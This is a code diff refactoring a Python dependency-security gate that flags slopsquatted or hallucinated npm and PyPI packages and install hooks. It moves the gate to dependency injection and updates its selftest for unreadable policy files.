-            real_text = vbp.read_text(encoding="utf-8")
-            for label, line in [("缺席", ""), ("x", "mode: x"), ("Enforce", "mode: Enforce"), ("空字串", 'mode: ""'),
-                                ("shadow", "mode: shadow"), ("enforce", "mode: enforce"), ("整個檔缺席", None),
-                                ("整個檔語法錯誤", ("gates: [\n",)), ("整個檔不是 mapping", ("- a\n",))]:
-                gp, sp = Path(d, "G1.json"), Path(d, "G1.sarif")
-                if line is None:
-                    vbp.unlink(missing_ok=True)
-                elif isinstance(line, tuple):
-                    vbp.write_text(line[0], encoding="utf-8")
-                else:
-                    vbp.write_text(real_text, encoding="utf-8")   # 每一輪都從原本的內容改起
-                    set_mode_line(vbp, line)
-                gp.unlink(missing_ok=True)
-                sp.write_text('{"stale": true}', encoding="utf-8")
-                _POLICY = None
-                queried.clear()
-                try:
-                    with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
-                        code = main(["g1_slopcheck.py", "--target", str(D), "--gate", str(gp), "--sarif", str(sp)], policy_root=pr)
-                except Exception as e:
-                    fails.append(f"mode {label} → 不得拋例外（得到 {type(e).__name__}：{e}）"); continue
-                g = json.loads(gp.read_text(encoding="utf-8")) if gp.is_file() else {}
-                if label in ("shadow", "enforce"):
-                    if code != 0 or g.get("status") != "pass" or g.get("mode") != label or queried != ["express"]:
-                        fails.append(f"mode {label} → 照常執行、閘門結果的 mode 取自政策（得到 exit {code}、{g.get('status')}、"
-                                     f"mode={g.get('mode')}、查詢 {queried}）")
-                    continue
-                why = g.get("status_reason") or ""
-                about_mode = isinstance(line, str)   # mode 本身的錯誤要寫明 mode；整個檔讀不到則寫明例外類別
-                cov = [(c["control_id"], c["state"], (c["reason"] or "").startswith(POLICY_UNREADABLE)) for c in g.get("coverage") or []]
-                if code != 2 or g.get("status") != "incomplete" or not why.startswith(POLICY_UNREADABLE + "（") \
-                        or (about_mode and "mode" not in why) \
-                        or g.get("mode") != "enforce" or g.get("findings_count") != {"blocking": 0, "advisory": 0} \
-                        or g.get("tools") != [gate_result.tool(TOOL_NAME, "error", version=TOOL_VERSION)] \
-                        or cov != [("VS-G1-SLOPSQUAT", "untested", True), ("VS-G1-COOLDOWN", "untested", True),
-                                   ("VS-G1-INSTALL-HOOK", "untested", True), ("VS-G1-SBOM", "pending", False),
-                                   ("ASVS5-V15.2", "pending", False)] \
-                        or queried or sp.exists() or list(schema.iter_errors(g)):
-                    fails.append(f"mode {label} → 退出碼 2、incomplete（政策讀不到）、mode 記 enforce、三個控制 untested、"
-                                 f"SBOM／KEV pending、tool 列只有一列 error、不查 registry、舊 SARIF 刪掉（得到 exit {code}、"
-                                 f"查詢 {queried}、舊 SARIF 存在={sp.exists()}、{g}）")
-    finally:
-        npm_check, pypi_check, pypi_requires, _POLICY = real_checks
+    rec = CleanRegistry()                       # 記錄查詢：政策讀不到時一個都不能有
+    queried = rec.queried
+    with tempfile.TemporaryDirectory() as d, temp_policy_root() as pr:
+        D = Path(d) / "proj"
+        D.mkdir()
+        (D / "package.json").write_text(json.dumps({"dependencies": {"express": "4.21.2"}}))
+        git(D, "init", "-q"); git(D, "add", "package.json"); git(D, "commit", "-qm", "t")
+        vbp = pr / "vibesec.yaml"
+        real_text = vbp.read_text(encoding="utf-8")
+        for label, line in [("缺席", ""), ("x", "mode: x"), ("Enforce", "mode: Enforce"), ("空字串", 'mode: ""'),
+                            ("shadow", "mode: shadow"), ("enforce", "mode: enforce"), ("整個檔缺席", None),
+                            ("整個檔語法錯誤", ("gates: [\n",)), ("整個檔不是 mapping", ("- a\n",))]:
+            gp, sp = Path(d, "G1.json"), Path(d, "G1.sarif")
+            if line is None:
+                vbp.unlink(missing_ok=True)
+            elif isinstance(line, tuple):
+                vbp.write_text(line[0], encoding="utf-8")
+            else:
+                vbp.write_text(real_text, encoding="utf-8")   # 每一輪都從原本的內容改起
+                set_mode_line(vbp, line)
+            gp.unlink(missing_ok=True)
+            sp.write_text('{"stale": true}', encoding="utf-8")
+            queried.clear()
+            try:
+                with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
+                    code = main(["g1_slopcheck.py", "--target", str(D), "--gate", str(gp), "--sarif", str(sp)], policy_root=pr,
+                                env_factory=lambda root: default_env(root, pr, registry=rec))
+            except Exception as e:
+                fails.append(f"mode {label} → 不得拋例外（得到 {type(e).__name__}：{e}）"); continue
+            g = json.loads(gp.read_text(encoding="utf-8")) if gp.is_file() else {}
+            if label in ("shadow", "enforce"):
+                if code != 0 or g.get("status") != "pass" or g.get("mode") != label or queried != ["express"]:
+                    fails.append(f"mode {label} → 照常執行、閘門結果的 mode 取自政策（得到 exit {code}、{g.get('status')}、"
+                                 f"mode={g.get('mode')}、查詢 {queried}）")
+                continue
+            why = g.get("status_reason") or ""
+            about_mode = isinstance(line, str)   # mode 本身的錯誤要寫明 mode；整個檔讀不到則寫明例外類別
+            cov = [(c["control_id"], c["state"], (c["reason"] or "").startswith(POLICY_UNREADABLE)) for c in g.get("coverage") or []]
+            if code != 2 or g.get("status") != "incomplete" or not why.startswith(POLICY_UNREADABLE + "（") \
+                    or (about_mode and "mode" not in why) \
+                    or g.get("mode") != "enforce" or g.get("findings_count") != {"blocking": 0, "advisory": 0} \
+                    or g.get("tools") != [gate_result.tool(TOOL_NAME, "error", version=TOOL_VERSION)] \
+                    or cov != [("VS-G1-SLOPSQUAT", "untested", True), ("VS-G1-COOLDOWN", "untested", True),
+                               ("VS-G1-INSTALL-HOOK", "untested", True), ("VS-G1-SBOM", "pending", False),
+                               ("ASVS5-V15.2", "pending", False)] \
+                    or queried or sp.exists() or list(schema.iter_errors(g)):
+                fails.append(f"mode {label} → 退出碼 2、incomplete（政策讀不到）、mode 記 enforce、三個控制 untested、"
+                             f"SBOM／KEV pending、tool 列只有一列 error、不查 registry、舊 SARIF 刪掉（得到 exit {code}、"
+                             f"查詢 {queried}、舊 SARIF 存在={sp.exists()}、{g}）")
 
+    shutil.rmtree(CR, ignore_errors=True)
     return fails
 
-def main(argv, policy_root=ROOT):
-    """policy_root：阻擋政策所在的 repo（selftest 指向壞政策檔）。"""
-    global TARGET, _POLICY
+def default_env(root, policy_root=ROOT, registry=None):
+    """命令列的 Env：政策從 policy_root 載入（讀不到 → (None, 未完成原因)）、Git 是生產的 SubprocessGit（工作目錄是被掃描的專案）、
+    登錄庫缺省是生產的 HttpRegistry、設定取自本 repo。"""
+    sys.path.insert(0, str(Path(__file__).resolve().parent))
+    from vibesec_policy import load_policy
+    policy, problem = load_policy(policy_root)
+    if problem:
+        return None, problem
+    return build_env(policy, git=SubprocessGit(root), registry=registry), None
+
+def main(argv, policy_root=ROOT, env_factory=None):
+    """policy_root：阻擋政策所在的 repo（selftest 指向壞政策檔）。env_factory：測試注入的外部依賴，root（被掃描的專案）→
+    (Env | None, 政策讀不到的原因 | None)；沒有給（命令列）就用 default_env。"""
     args = argv[1:]
     if "--help" in args or "-h" in args:
         print(__doc__.strip())
@@ -1370,140 +1266,95 @@ def main(argv, policy_root=ROOT):
         return 1 if fails else 0
     started = gate_result.now()   # 時間戳一律 +00:00（以前 G1 寫 Z，#181）
     target = (_opt(args, "--target") or [None])[-1]
+    root = ROOT                                             # 被掃描的專案根目錄；--target 改寫
     if target:
-        TARGET = Path(target).expanduser().resolve()
-        if not TARGET.is_dir():
+        root = Path(target).expanduser().resolve()
+        if not root.is_dir():
             print(f"⚠️ G1 無法完成檢查：--target 不是目錄（{target}）→ incomplete。", file=sys.stderr)
             return 2
-    manifests = list(_opt(args, "--manifest"))
-    rule_files = list(_opt(args, "--rules-file"))
-    base = (_opt(args, "--base") or [None])[-1]
+    request = Request(target=root if target else None, manifests=tuple(_opt(args, "--manifest")),
+                      rule_files=tuple(_opt(args, "--rules-file")), changed_lists=tuple(_opt(args, "--changed-files")),
+                      staged="--staged" in args, base=(_opt(args, "--base") or [None])[-1])
+    base, scope = request.base, request.kind                # --staged／--changed-files／--base 只看變更 → scope diff
     sarif_out = (_opt(args, "--sarif") or [None])[-1]
     gate_out = (_opt(args, "--gate") or [None])[-1]
-    git = _git()
-    commit = head_commit(TARGET) if gate_out else None      # 只用來填閘門結果；不在 Git 接縫內
-    changed = []
-    # --staged／--changed-files／--base 只看變更 → scope diff（以前只有給 --base 才記 diff）
-    scope = "diff" if base or "--staged" in args or _opt(args, "--changed-files") else "full"
-    if _POLICY is None:   # 進入點只建立一次（selftest 可預先指定）；讀不到 → incomplete，不分類任何發現
-        sys.path.insert(0, str(Path(__file__).resolve().parent))
-        from vibesec_policy import load_policy
-        _POLICY, problem = load_policy(policy_root)
-        if problem:
-            print(f"⚠️ G1 無法完成檢查：{problem} → incomplete。", file=sys.stderr)
-            if sarif_out:
-                gate_result.remove_stale(sarif_out)   # 不讓上一次的 SARIF 被當成這一次的結果（#181）
-            if gate_out:
-                write_unreadable_gate(gate_out, problem, started, base, scope, commit)
-            return 2
-    if "--staged" in args:
-        staged = git.staged()
-        if isinstance(staged, GitFailure):
-            print(f"⚠️ G1 無法完成檢查：--staged 取不到暫存區變更（{staged.reason}）→ incomplete。", file=sys.stderr)
-            if gate_out:
-                write_gate(gate_out, [], [f"--staged 取不到暫存區變更：{staged.reason}"], started, base, scope, sarif_out, commit=commit)
-            return 2
-        changed += staged
-    for lst in _opt(args, "--changed-files"):
-        try:
-            # surrogateescape：清單裡一個非 UTF-8 的路徑不得讓整份清單崩潰（嚴格解碼會丟 UnicodeDecodeError，#283）
-            changed += [l.strip() for l in Path(lst).read_text(encoding="utf-8", errors="surrogateescape").splitlines() if l.strip()]
-        except OSError as e:
-            # 清單讀不到 = 不知道改了什麼；以前靜默當成「沒有變更」而 pass（第四次審視 S-8）
-            print(f"⚠️ G1 無法完成檢查：--changed-files {lst} 讀不到（{e}）→ incomplete。", file=sys.stderr)
-            if gate_out:
-                write_gate(gate_out, [], [f"變更檔清單讀不到：{lst}"], started, base, scope, sarif_out, commit=commit)
-            return 2
-    selected = manifests or rule_files or changed or "--staged" in args or _opt(args, "--changed-files")
-    if target and not selected:
-        changed = discover(TARGET, git)     # 只給 --target：全量掃描目標專案
-    pre_incomplete, notes = [], []
-    # 明確指定（--manifest／--rules-file）卻不存在 → 要掃的東西沒掃到，incomplete（以前靜默丟掉而 pass）
-    missing = [p for p in dict.fromkeys(manifests + rule_files) if not resolve(p).exists()]
-    if missing:
-        pre_incomplete.append(f"指定的檔案不存在，未檢查：{', '.join(missing)}")
-    gone, unknown = [], []
-    for f in dict.fromkeys(changed):
-        is_m = classify(f).kind != "other"
-        is_r = not is_m and is_rule_file(f) and not (f.startswith("config/slopsquat/") and not external_target())
-        if not (is_m or is_r):
-            continue
-        if not resolve(f).exists():
-            # 變更清單中的檔不存在：在 base 有、HEAD 沒有 = 這次 diff 刪掉的檔，正常略過；
-            # 給了 --base 卻在 base 也找不到 → 清單與 diff 對不上，incomplete
-            if base and git.show(base, rel_path(f if Path(f).is_absolute() else TARGET / f)) is None:
-                unknown.append(f)
-            else:
-                gone.append(f)
-            continue
-        (manifests if is_m else rule_files).append(f)
-    if gone:
-        notes.append(f"變更清單中已刪除的檔（略過）：{', '.join(gone)}")
-    if unknown:
-        pre_incomplete.append(f"變更清單中的檔案不存在，且不在 base {base}：{', '.join(unknown)}")
-    manifests = [resolve(m) for m in dict.fromkeys(manifests) if resolve(m).exists()]
-    rule_files = [resolve(r) for r in dict.fromkeys(rule_files) if resolve(r).exists()]
-    project = _policy().for_project(TARGET)      # 受驗樹的政策例外：外部專案 → 不套用，note 說明
+    commit = head_commit(root) if gate_out else None        # 只用來填閘門結果；不在 Git 接縫內
+    env, problem = env_factory(root) if env_factory else default_env(root, policy_root)   # 政策只在進入點載入一次
+    if problem:          # 讀不到 → incomplete，不分類任何發現、不查 registry
+        print(f"⚠️ G1 無法完成檢查：{problem} → incomplete。", file=sys.stderr)
+        if sarif_out:
+            gate_result.remove_stale(sarif_out)   # 不讓上一次的 SARIF 被當成這一次的結果（#181）
+        if gate_out:
+            write_unreadable_gate(gate_out, problem, started, base, scope, commit, config_root=policy_root)
+        return 2
+    scoped = resolve_scope(request, env)
+    if scoped.failure:
+        print(scoped.failure.message, file=sys.stderr)
+        if gate_out:
+            write_gate(env, gate_out, [], [scoped.failure.problem], started, base, scope, sarif_out, commit=commit)
+        return 2
+    pre_incomplete, notes = list(scoped.problems), list(scoped.notes)
+    manifests, rule_files = list(scoped.manifests), list(scoped.rule_files)
+    project = env.policy.for_project(root)      # 受驗樹的政策例外：外部專案 → 不套用，note 說明
     if project.note:
         notes.append(project.note)
 
     if not manifests and not rule_files:
         out = {"gate": "G1", "findings": []}
-        if external_target():
-            out["target"] = str(TARGET)
+        if external_target(env, root):
+            out["target"] = str(root)
         if pre_incomplete:
             out["status"], out["status_reason"] = "incomplete", "；".join(pre_incomplete)
         print(_dumps(out))
         if sarif_out:
             write_sarif(sarif_out, [])
         if gate_out:
-            write_gate(gate_out, [], pre_incomplete, started, base, scope, sarif_out, notes, commit=commit)
+            write_gate(env, gate_out, [], pre_incomplete, started, base, scope, sarif_out, notes, commit=commit)
         if pre_incomplete:
             print(f"⚠️ G1 無法完成檢查：{'；'.join(pre_incomplete)} → incomplete。", file=sys.stderr)
             return 2
         print("G1 slopcheck：無相依清單或規則檔變更，略過。", file=sys.stderr)
         return 0
 
-    c = cfg()
+    c = cfg(env)
     # 相似度只比對同生態系的熱門清單（npm 的 request 不該被比成 PyPI 的 requests）
-    popular = {"npm": load_popular("popular-npm.txt"), "pypi": load_popular("popular-pypi.txt")}
-    blacklist = load_list("blacklist.yaml")
-    allowlist, ignored_allowlist = load_allowlist()
+    popular = {"npm": load_popular(env, "popular-npm.txt"), "pypi": load_popular(env, "popular-pypi.txt")}
+    blacklist = load_list(env, "blacklist.yaml")
+    allowlist, ignored_allowlist = load_allowlist(env)
     if ignored_allowlist:
         notes.append("忽略的 allowlist 條目：" + "；".join(ignored_allowlist))
 
-    targets = [(m, added_packages(m, base, git), False) for m in manifests]
-    targets += [(r, rule_file_mentions(r), True) for r in rule_files]
+    targets = [(m, added_packages(root, m, base, env.git), False) for m in manifests]
+    targets += [(r, rule_file_mentions(env, r), True) for r in rule_files]
 
-    findings, incomplete = [], list(pre_incomplete) + config_problems()
-    parsed = {m: parse_manifest([m], root=TARGET) for m in manifests}      # 每個清單解析一次；無解析器的檔由解析模組回報
-    unparsed = [rel_path(u) for m in manifests for u in parsed[m].unparsed]
+    findings, incomplete = [], list(pre_incomplete) + config_problems(env)
+    parsed = {m: parse_manifest([m], root=root) for m in manifests}      # 每個清單解析一次；無解析器的檔由解析模組回報
+    unparsed = [rel_path(root, u) for m in manifests for u in parsed[m].unparsed]
     if unparsed:
         incomplete.append(f"鎖定檔尚無解析器，其中的套件未逐一檢查：{', '.join(unparsed)}")
     indirect = {}       # package-lock.json、requirements 鎖定檔 → 只以間接相依出現的 (名稱小寫, 版本)：不做名稱相似度
     for m in manifests:
         bad = parsed[m].bad
         if bad:
-            incomplete.append(f"{rel_path(m)}：{len(bad)} 筆無法解析或不是 registry 來源，未檢查"
+            incomplete.append(f"{rel_path(root, m)}：{len(bad)} 筆無法解析或不是 registry 來源，未檢查"
                               f"（{', '.join(bad[:5])}{' …' if len(bad) > 5 else ''}）")
         if Path(m).name in ("package-lock.json", "npm-shrinkwrap.json"):
             indirect[m] = {(d.name.lower(), d.version) for d in parsed[m].entries if d.direct is False}
         elif REQUIREMENTS_RE.search(Path(m).as_posix()):
-            indirect[m] = requirements_indirect(m)
+            indirect[m] = requirements_indirect(env, m)
 
     # registry 查詢：同一個 (生態系, 名稱, 版本) 只查一次，並行查詢（鎖定檔動輒上千筆）
     # allowlist 內的套件也要查：allowlist 只放行特定檢查，安裝 hook 等其他檢查照做
     jobs = list(dict.fromkeys((e, n, v) for _, pk, _ in targets for e, n, v in pk))
-    _policy()           # 先載入政策，避免執行緒競爭初始化
-    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
-        checked = dict(zip(jobs, ex.map(lambda j: _check_job(j[0], j[1], j[2], c), jobs)))
+    with ThreadPoolExecutor(max_workers=env.workers) as ex:
+        checked = dict(zip(jobs, ex.map(lambda j: _check_job(env, j[0], j[1], j[2], c), jobs)))
 
     for source, packages, from_rules in targets:
-        source_rel = rel_path(source)
+        source_rel = rel_path(root, source)
         for eco, name, ver in packages:
             found = []
             fuzzy = (name.lower(), ver) not in indirect.get(source, ())
-            sim = similarity_check(name, eco, popular.get(eco, set()), blacklist, c, fuzzy)
+            sim = similarity_check(env, name, eco, popular.get(eco, set()), blacklist, c, fuzzy)
             if sim:
                 found.append(sim)
             fs, reason = checked[(eco, name, ver)]
@@ -1512,7 +1363,7 @@ def main(argv, policy_root=ROOT):
                 for f in fs:
                     if f["rule_id"] == "vibesec.g1.hallucinated-package":
                         f["rule_id"] = "vibesec.g1.rules-file-unknown-package"
-                        f["policy_tier"] = _policy().cap(f["rule_id"], f["policy_tier"])   # 改名後依政策重算
+                        f["policy_tier"] = env.policy.cap(f["rule_id"], f["policy_tier"])   # 改名後依政策重算
             found.extend(fs)
             if reason:
                 incomplete.append(reason)
@@ -1521,9 +1372,9 @@ def main(argv, policy_root=ROOT):
                 findings.append(apply_exceptions(apply_allowlist(f, allowlist, ver), project))
 
     for m in manifests:
-        f = self_install_hooks(m)
+        f = self_install_hooks(env, m)
         if f:
-            f["manifest"] = rel_path(m)
+            f["manifest"] = rel_path(root, m)
             findings.append(apply_exceptions(f, project))
     pypi_checked = sum(1 for e, _, _ in jobs if e == "pypi")
     notes += project.report(findings, "G1")   # 命中筆數與本閘門忽略的例外（各閘門相同的文字）
@@ -1532,8 +1383,8 @@ def main(argv, policy_root=ROOT):
     coverage = gate_coverage(findings, incomplete, pypi_checked)
     status, status_reason = gate_status(findings, incomplete, coverage)
     out = {"gate": "G1", "findings": findings}
-    if external_target():
-        out["target"] = str(TARGET)
+    if external_target(env, root):
+        out["target"] = str(root)
         out["notes"] = notes
     if project.ignored:
         out["ignored_exceptions"] = project.ignored
@@ -1551,7 +1402,7 @@ def main(argv, policy_root=ROOT):
     if sarif_out:
         write_sarif(sarif_out, findings)
     if gate_out:
-        write_gate(gate_out, findings, incomplete, started, base, scope, sarif_out, notes, pypi_checked=pypi_checked, commit=commit)
+        write_gate(env, gate_out, findings, incomplete, started, base, scope, sarif_out, notes, pypi_checked=pypi_checked, commit=commit)
 
     blocking = [f for f in findings if f["policy_tier"] == "blocking"]
     if blocking:
